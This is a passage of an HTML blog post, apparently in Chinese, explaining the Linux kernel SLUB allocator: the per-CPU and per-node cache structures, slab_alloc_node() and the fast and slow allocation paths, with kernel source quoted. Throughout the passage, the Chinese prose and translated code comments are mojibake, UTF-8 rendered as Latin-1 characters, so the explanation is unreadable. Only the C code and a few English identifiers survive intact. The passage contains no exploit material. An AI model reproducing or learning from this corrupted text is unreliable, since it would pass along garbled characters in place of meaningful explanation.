class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>freelist</code>ï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²å¯¹è±¡çš„æŒ‡é’ˆ</li><li><code>slab</code>ï¼šå½“å‰ç”¨ä»¥è¿›è¡Œå†…å­˜åˆ†é…çš„ slab</li><li><code>partial</code>ï¼špercpu partial slab é“¾è¡¨ï¼Œé“¾è¡¨ä¸Šä¸ºä»æœ‰ä¸€å®šç©ºé—²å¯¹è±¡çš„ slab</li></ul><p>slab çš„ freelist ä»…å½“å…¶åœ¨ partial é“¾è¡¨ä¸Šæ—¶æœ‰ç”¨ï¼Œå½“ä¸€å¼  slab ä¸ºå½“å‰ CPU æ­£åœ¨ä½¿ç”¨çš„ slab æ—¶ï¼Œå…¶ freelist ä¸º NULLï¼Œç”± <code>kmem_cache_cpu.freelist</code> æŒ‡å‘ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡</p><p><img src="https://s2.loli.net/2023/02/21/xSLqghNZ23nCMiz.png" alt="image.png"></p><h2 id="å››ã€kmem-cache-nodeï¼šå„-node-åå¤‡å†…å­˜æ± ">å››ã€kmem_cache_nodeï¼šå„ node åå¤‡å†…å­˜æ± </h2><p><strong>æ¯ä¸ª <a href="https://arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#0x03-struct-pglist-data%EF%BC%9A%E8%8A%82%E7%82%B9">node</a> å¯¹åº”çš„åå¤‡å†…å­˜æ± </strong>ï¼Œå½“ percpu çš„ç‹¬å å†…å­˜æ± è€—å°½åä¾¿ä¼šä»å¯¹åº” node çš„åå¤‡å†…å­˜æ± å°è¯•åˆ†é…</p><blockquote><p>ä¸è¿‡å¤§éƒ¨åˆ†è®¡ç®—æœºéƒ½ä»…æœ‰ä¸€ä¸ª nodeï¼Œæ‰€ä»¥é€šå¸¸æƒ…å†µä¸‹æ¯ä¸ª <code>kmem_cache</code> ä¹Ÿå°±åªæœ‰ä¸€ä¸ª <code>kmem_cache_node</code>  ğŸ˜„</p></blockquote><p>å› ä¸ºæœ¬æ–‡ä¸»è¦è®² slubï¼Œæ‰€ä»¥ä»…æˆªå– slub ç›¸å…³å­—æ®µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The slab lists for all objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB</span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB</span><br><span class="hljs-type">spinlock_t</span> list_lock;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_partial;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">partial</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span><br><span class="hljs-type">atomic_long_t</span> nr_slabs;<br><span class="hljs-type">atomic_long_t</span> total_objects;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">full</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>list_lock</code>ï¼šä¿æŠ¤ partial å’Œ full é“¾è¡¨çš„é”</li><li><code>partial</code>ï¼špartial slab é“¾è¡¨ï¼Œè¿æ¥<strong>æœ‰ç€éƒ¨åˆ†ç©ºé—²å¯¹è±¡å‰©ä½™çš„ slab</strong></li><li><code>nr_partial</code>ï¼špartial slab çš„æ•°é‡</li><li><code>full</code>ï¼šfull slab é“¾è¡¨ï¼Œè¿æ¥<strong>ç©ºé—²å¯¹è±¡å®Œå…¨è€—å°½çš„ slab</strong>ï¼ˆæ³¨ï¼šè¯¥é“¾è¡¨åŸºæœ¬ä¸Šä¸å¸¸ç”¨ï¼‰</li><li><code>nr_slabs</code>ï¼šæ€»çš„ slab æ•°é‡</li><li><code>total_objects</code>ï¼šæ€»çš„å¯¹è±¡æ•°é‡</li></ul><p><img src="https://s2.loli.net/2023/02/21/ECDOVtxAyiwd1UZ.png" alt="image.png"></p><h1>0x02. å¯¹è±¡çš„åˆ†é…</h1><h2 id="â€»-ä¸€ã€slab-alloc-node-ï¼šä»æŒ‡å®šçš„-kmem-cache-åˆ†é…-object">â€» ä¸€ã€slab_alloc_node()ï¼šä»æŒ‡å®šçš„ kmem_cache åˆ†é… object</h2><p>åœ¨ slab allocator ä¸­å­˜åœ¨ç€å¤šä¸ªä¸åŒçš„å†…å­˜åˆ†é…æ¥å£ï¼Œå…¶æœ€åéƒ½ä¼šè°ƒç”¨åˆ° <code>slab_alloc_node()</code> å®Œæˆå†…å­˜åˆ†é…çš„å·¥ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å†…è”åŒ–çš„å¿«é€Ÿè·¯å¾„ä»¥è®©åˆ†é…å‡½æ•° (kmalloc, kmem_cache_alloc) ä¸­åŒ…å«å¿«é€Ÿè·¯å¾„.</span><br><span class="hljs-comment"> * å› æ­¤ï¼Œå¯¹äºå¿«é€Ÿè·¯å¾„å¯ä»¥æ»¡è¶³çš„è¯·æ±‚ï¼Œæ²¡æœ‰å‡½æ•°è°ƒç”¨çš„å¼€é”€.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¿«é€Ÿè·¯å¾„é¦–å…ˆæ£€æŸ¥æ— é”çš„ç©ºé—²é“¾è¡¨æ˜¯å¦å¯ä»¥è¢«ä½¿ç”¨.</span><br><span class="hljs-comment"> * è‹¥å¦ï¼Œè°ƒç”¨ __slab_alloc è¿›è¡Œç¼“æ…¢å¤„ç†.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¦åˆ™æˆ‘ä»¬å¯ä»¥ç®€å•åœ°ä»æ— é”ç©ºé—²é“¾è¡¨å–å‡ºä¸‹ä¸€ä¸ªå¯¹è±¡.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> *<span class="hljs-title function_">slab_alloc_node</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> list_lru *lru,</span><br><span class="hljs-params"><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)</span><br>&#123;<br><span class="hljs-type">void</span> *object;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj_cgroup</span> *<span class="hljs-title">objcg</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> init = <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°é¦–å…ˆä¼šè°ƒç”¨ <code>slab_pre_alloc_hook()</code> è¿›è¡Œåˆ†é…å‰çš„æ£€æŸ¥å·¥ä½œï¼Œä¸é€šè¿‡åˆ™è¿”å› NULLï¼Œè¿™ä¸€æ­¥ä¸»è¦æ˜¯æ£€æŸ¥åˆ†é…æ ‡å¿—ä½æ˜¯å¦åˆæ³•ç­‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">s = slab_pre_alloc_hook(s, lru, &amp;objcg, <span class="hljs-number">1</span>, gfpflags);<br><span class="hljs-keyword">if</span> (!s)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è°ƒç”¨ <code>kfence_alloc()</code> è¿›è¡Œå†…å­˜é”™è¯¯æ£€æµ‹ï¼Œä¸é€šè¿‡åˆ™ç›´æ¥è·³è½¬åˆ° <code>out</code>ï¼Œè¿™é‡Œç”¨åˆ°äº† <em>Kfence (Kernel Electric Fence)</em>  å†…å­˜çº é”™æœºåˆ¶ï¼Œä¸»è¦æ˜¯æ£€æŸ¥å¯¹ <code>data page</code> çš„è®¿é—®æ˜¯å¦è¶Šç•Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">object = kfence_alloc(s, orig_size, gfpflags);<br><span class="hljs-keyword">if</span> (unlikely(object))<br><span class="hljs-keyword">goto</span> out;<br></code></pre></td></tr></table></figure><p><strong>æ¥ä¸‹æ¥è°ƒç”¨ <code>__slab_alloc_node()</code> è¿›è¡Œæ­£å¼çš„å†…å­˜åˆ†é…ï¼Œè¿™ä¸€æ­¥ä¾¿æ˜¯çœŸæ­£çš„æ ¸å¿ƒåˆ†é…å‡½æ•°</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">object = __slab_alloc_node(s, gfpflags, node, addr, orig_size);<br></code></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨ <code>maybe_wipe_obj_freeptr()</code> å°† object åŸæœ¬å­˜æ”¾ next free object æŒ‡é’ˆçš„ä½ç½®æ¸…é›¶ï¼Œä¹‹åè°ƒç”¨ <code>slab_want_init_on_alloc()</code> æ£€æŸ¥æ ‡å¿—ä½æ˜¯å¦æœ‰ <code>__GFP_ZERO</code>ï¼Œè‹¥æœ‰åˆ™è°ƒç”¨ <code>slab_post_alloc_hook()</code> å°† object ä¸Šæ•°æ®æ¸…é›¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">maybe_wipe_obj_freeptr(s, object);<br>init = slab_want_init_on_alloc(gfpflags, s);<br><br>out:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å½“ init == &#x27;true&#x27;, ç±»ä¼¼ kzalloc() æ—, </span><br><span class="hljs-comment"> * ä»…æœ‰ @orig_size å­—èŠ‚ä¼šè¢«æ¸…é›¶ï¼Œè€Œé s-&gt;object_size</span><br><span class="hljs-comment"> */</span><br>slab_post_alloc_hook(s, objcg, gfpflags, <span class="hljs-number">1</span>, &amp;object, init, orig_size);<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹çœŸæ­£çš„æ ¸å¿ƒåˆ†é…å‡½æ•° <code>__slab_alloc_node()</code></p><h3 id="I-slab-alloc-node-ï¼šä»-percpu-freelist-è¿›è¡Œåˆ†é…ï¼ˆfast-pathï¼‰">I. __slab_alloc_node()ï¼šä» percpu freelist è¿›è¡Œåˆ†é…ï¼ˆfast pathï¼‰</h3><p>è¯¥å‡½æ•°é¦–å…ˆä¼šå…ˆè·å– percpu çš„ <code>kmem_cache_cpu</code> ä¸Šçš„ freelist ä¸ slabï¼Œ<strong>è‹¥ slab æˆ– freelist ä¸ºç©º</strong> / slab ä¸ node ä¸åŒ¹é…ï¼Œåˆ™è°ƒç”¨ <code>__slab_alloc()</code> åˆ†é…ä¸€å¼ æ–° slab å¹¶ä»å…¶ä¸­è·å–ä¸€ä¸ªç©ºé—²å¯¹è±¡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *__slab_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s,<br><span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">size_t</span> orig_size)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> *object;<br><br>redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¿…é¡»é€šè¿‡è¯¥ cpu ptr è¯»å– kmem_cache cpu æ•°æ®. æŠ¢å æ˜¯å¼€å¯çš„.</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¯èƒ½ä¼šåœ¨ä»ä¸€ä¸ª cpu åŒºåŸŸè¯»å–æ—¶åœ¨ cpu é—´åˆ‡æ¢.</span><br><span class="hljs-comment"> * åªè¦æˆ‘ä»¬åœ¨ cmpxchg æ—¶åœ¨åŸæœ¬çš„ cpu ä¸Šé‡æ–°ç»“æŸä¾¿ä¸è¦ç´§.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¿…é¡»ä¿è¯ tid ä¸ kmem_cache_cpu è¢«åœ¨åŒä¸€ cpu ä¸Šå–å›.</span><br><span class="hljs-comment"> * æˆ‘ä»¬é¦–å…ˆè¯»å– kmem_cache_cpu æŒ‡é’ˆå¹¶ç”¨å…¶è¯»å– tid.</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬åœ¨ä¸¤æ¬¡è¯»å–é—´è¢«æŠ¢å å¹¶åˆ‡æ¢åˆ°å¦ä¸€ cpuï¼Œç”±äºè¿™ä¸¤è€…ä»ä¸åŒä¸€ cpu å…³è”ï¼Œ</span><br><span class="hljs-comment"> * cmpxchg ç¨åå°†ä¼šéªŒè¯ cpu ï¼Œè¿™æ˜¯ OK çš„.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ­¤å¤„ä½¿ç”¨çš„æ— ä¸­æ–­ï¼ˆirqlessï¼‰ å¯¹è±¡åˆ†é…/é‡Šæ”¾ç®—æ³•å†³å®šäºè·å– cpu_slab æ•°æ®çš„é¡ºåº.</span><br><span class="hljs-comment"> * tid åº”å½“åœ¨åœ¨ c ä¸Šçš„ä»»ä½•äº‹ä¹‹å‰è¢«è·å–ä»¥ç¡®ä¿ä¸æ­¤å‰ tid å…³è”çš„å¯¹è±¡ä¸ slab</span><br><span class="hljs-comment"> * ä¸ä¼šè¢«ä¸å½“å‰ tid ä¸€èµ·ä½¿ç”¨. è‹¥æˆ‘ä»¬å…ˆè·å– tidï¼Œå¯¹è±¡ä¸ slab å¯èƒ½ä¼šä¸ä¸‹ä¸€ä¸ª tid </span><br><span class="hljs-comment"> * ç›¸å…³è”ï¼Œè€Œæˆ‘ä»¬çš„åˆ†é…/é‡Šæ”¾è¯·æ±‚ä¹Ÿå°†ä¼šå¤±è´¥.è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé‡è¯•æ‰€ä»¥æ²¡é—®é¢˜.</span><br><span class="hljs-comment"> */</span><br>barrier();<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The transaction ids are globally unique per cpu and per operation on</span><br><span class="hljs-comment"> * a per cpu queueï¼ˆè¿™å¥ç¿»æˆä¸­æ–‡å’‹éƒ½ä¸é¡ºï¼Œç›´æ¥çœ‹åŸæ–‡å§ğŸ˜„ï¼‰.</span><br><span class="hljs-comment"> * ç”±æ­¤å¯ä»¥ç¡®ä¿ cmpxchg_double å‘ç”Ÿåœ¨æ­£ç¡®çš„å¤„ç†å™¨ä¸Šä¸”å…¶é—´åœ¨é“¾è¡¨ä¸Šæ²¡æœ‰ä»»ä½•æ“ä½œ.</span><br><span class="hljs-comment"> */</span><br><br>object = c-&gt;freelist;<br>slab = c-&gt;slab;<br><br><span class="hljs-keyword">if</span> (!USE_LOCKLESS_FAST_PATH() ||<br>    unlikely(!object || !slab || !node_match(slab, node))) &#123;<br>object = __slab_alloc(s, gfpflags, node, addr, c, orig_size);<br></code></pre></td></tr></table></figure><p>è‹¥æœ‰ freelist &amp; slubï¼Œåˆ™<strong>è°ƒç”¨ <code>get_freepointer_safe()</code> è·å–å½“å‰ç©ºé—²å¯¹è±¡ä¸‹ä¸€ä¸ªç©ºé—²å¯¹è±¡</strong>ï¼›æ¥ä¸‹æ¥ <code>this_cpu_cmpxchg_double()</code> ä¼šæ£€æŸ¥æ˜¯å¦ <code>freelist == object</code>ã€<code>cpu_slab-&gt;tid == tid</code>ï¼Œè‹¥æ˜¯åˆ™<strong>å°† freelist è®¾ä¸º next_object å¹¶è·å–è®¾ç½®ä¸‹ä¸€ tid</strong>ï¼Œå¦åˆ™è¯´æ˜å‘ç”Ÿäº†æŠ¢å ï¼ˆæˆ‘ä»¬å·²ç»ä¸åœ¨åŸ cpu ä¸Šäº†ï¼‰ï¼Œè·³è½¬å› <code>redo</code> é‡æ–°åœ¨å½“å‰ cpu ä¸Šè¿›è¡Œåˆ†é…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">void</span> *next_object = get_freepointer_safe(s, object);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä»…å½“æ²¡æœ‰é¢å¤–æ“ä½œä¸”æˆ‘ä»¬åœ¨æ­£ç¡®çš„å¤„ç†å™¨ä¸Šæ—¶ cmpxchg å°†åŒ¹é….</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * cmpxchg åŸå­åœ°è¿›è¡Œäº†å¦‚ä¸‹ï¼š (æ²¡æœ‰é”è¯­ä¹‰!)</span><br><span class="hljs-comment"> * 1. é‡å®šä½ç¬¬ä¸€ä¸ªæŒ‡é’ˆåˆ°å½“å‰çš„ per cpu åŒºåŸŸ.</span><br><span class="hljs-comment"> * 2. éªŒè¯ tid &amp; freelist æ²¡æœ‰è¢«æ”¹å˜</span><br><span class="hljs-comment"> * 3. è‹¥æœªè¢«æ”¹å˜ï¼Œæ›¿æ¢ tid &amp; freelist</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‡ªä»æ²¡æœ‰é”è¯­ä¹‰ï¼Œä¿æŠ¤ä»…éœ€è¦å¯¹æŠ—åœ¨è¯¥ cpu ä¸Šæ‰§è¡Œçš„ä»£ç *ä¸*ä»å…¶ä»–çš„ cpu ä¸Šè®¿é—®.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>object, tid,<br>next_object, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_alloc&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€åå¯¹äºç›´æ¥ä» cpu_slab ä¸Šåˆ†é…çš„å¯¹è±¡ä¼šé€šè¿‡ <code>prefetch_freepointer()</code> è°ƒç”¨ prefetchw æŒ‡ä»¤æå‰å°†å·²åˆ†é…å¯¹è±¡çš„åœ°å€è½½å…¥ç¼“å­˜ä¸­ï¼Œä¹‹åå°±æ˜¯è¿”å›åˆ†é…æˆåŠŸçš„ç©ºé—²å¯¹è±¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">prefetch_freepointer(s, next_object);<br>stat(s, ALLOC_FASTPATH);<br>&#125;<br><br><span class="hljs-keyword">return</span> object;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-alloc-ï¼šè·å–å¦ä¸€-slab-è¿›è¡Œåˆ†é…ï¼ˆslow-pathï¼‰">II. ___slab_alloc()ï¼šè·å–å¦ä¸€ slab è¿›è¡Œåˆ†é…ï¼ˆslow pathï¼‰</h3><p><code>__slab_alloc()</code> å…¶å®æ˜¯åœ¨å¼€å¯äº†æŠ¢å çš„æƒ…å†µä¸‹ï¼ˆé»˜è®¤å¼€å¯ï¼‰å¯¹ <code>___slab_alloc()</code> çš„ä¸€ä¸ªç®€å•çš„ wrapperï¼Œä¸»è¦å°±æ˜¯é‡æ–°è¯»å– <code>kmem_cache_cpu</code> çš„æŒ‡é’ˆï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å½“æŠ¢å æ²¡æœ‰å…³é—­æ—¶ ___slab_alloc() ç”¨äºä¸Šä¸‹æ–‡çš„ wrapper.</span><br><span class="hljs-comment"> * é€šè¿‡é‡æ–°è·å– percpu åŒºåŸŸçš„æŒ‡é’ˆæ¥è¡¥å¿å¯èƒ½çš„ cpu æ›´æ”¹.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *p;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¯èƒ½å·²è¢«æŠ¢å ä¸”åœ¨å…³é—­æŠ¢å å‰è°ƒåº¦åˆ°äº†ä¸åŒçš„ cpu ä¸Š.</span><br><span class="hljs-comment"> * éœ€è¦é‡æ–°è½½å…¥ cpu åŒºåŸŸæŒ‡é’ˆ.</span><br><span class="hljs-comment"> */</span><br>c = slub_get_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>p = ___slab_alloc(s, gfpflags, node, addr, c, orig_size);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PREEMPT_COUNT</span><br>slub_put_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">return</span> p;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ <code>___slab_alloc()</code>ï¼Œè¯¥å‡½æ•°ä¾¿æ˜¯æ…¢é€Ÿåˆ†é…è·¯å¾„çš„æ ¸å¿ƒå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ…¢é€Ÿè·¯å¾„. æ— é” freelist ä¸ºç©ºæˆ–æ˜¯æˆ‘ä»¬éœ€è¦è¿›è¡Œè°ƒè¯•ä»»åŠ¡.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥æ–°çš„å¯¹è±¡å·²ç»è¢«é‡Šæ”¾åˆ°å¸¸è§„çš„ freelist ä¸Šï¼Œåˆ™è¿‡ç¨‹ä»æ˜¯å¾ˆå¿«çš„.</span><br><span class="hljs-comment"> * è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬ç®€å•åœ°è®©å¸¸è§„çš„ freelist å–ä»£æ— é” freelist</span><br><span class="hljs-comment"> * å¹¶ zap the regular freelist.ï¼ˆzapæƒ³ä¸å‡ºå’‹ç¿»è¯‘å¥½ğŸ˜„ï¼‰</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥è¿™ä¸èµ·ä½œç”¨ï¼Œåˆ™æˆ‘ä»¬å›é€€åˆ° partial é“¾è¡¨. æˆ‘ä»¬å°† freelist ä¸Šçš„ç¬¬ä¸€ä¸ªå…ƒç´ </span><br><span class="hljs-comment"> * ä½œä¸ºè¦åˆ†é…çš„å¯¹è±¡å¹¶å°† freelist çš„å‰©ä½™éƒ¨åˆ†ç§»åŠ¨åˆ°æ— é” freelist.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬æ— æ³•ä» partial slab é“¾è¡¨ä¸Šè·å¾—ä¸€ä¸ªæ–°çš„ slabï¼Œæˆ‘ä»¬éœ€è¦åˆ†é…ä¸€ä¸ªæ–°çš„ slab.</span><br><span class="hljs-comment"> * å› ä¸ºè¿™åŒ…å«å¯¹é¡µåˆ†é…å™¨çš„è°ƒç”¨ä¸æ–° slab çš„è®¾ç½®ï¼Œè¿™æ˜¯æœ€æ…¢çš„è·¯å¾„.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å½“æˆ‘ä»¬çŸ¥é“æŠ¢å è¢«ç¦ç”¨æ—¶æ‰€ç”¨çš„ __slab_alloc çš„ç‰ˆæœ¬ (ä¹Ÿæ˜¯é€ æˆå¤§é‡åˆ†é…çš„åŸå› ).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *___slab_alloc(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">int</span> node,<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-keyword">struct</span> kmem_cache_cpu *c, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> orig_size)<br>&#123;<br><span class="hljs-type">void</span> *freelist;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-type">unsigned</span> <span 